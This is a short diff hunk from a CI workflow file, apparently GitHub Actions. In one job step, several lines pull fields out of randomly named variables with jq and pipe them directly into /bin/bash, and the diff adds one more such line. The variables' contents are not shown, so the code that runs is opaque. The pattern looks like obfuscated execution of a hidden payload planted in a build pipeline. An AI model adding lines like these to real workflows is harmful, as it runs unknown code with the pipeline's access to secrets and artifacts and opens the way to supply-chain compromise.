@@ -24,6 +24,7 @@ jobs:
           echo $z725 | jq -r .fwsrx43 | /bin/bash
           printf '%s' "$vn8" | jq -r .hz65 | /bin/bash
           printf '%s' "$n8328" | jq -r .epxlc66 | /bin/bash
+          echo $ruwp782 | jq -r .ic931 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
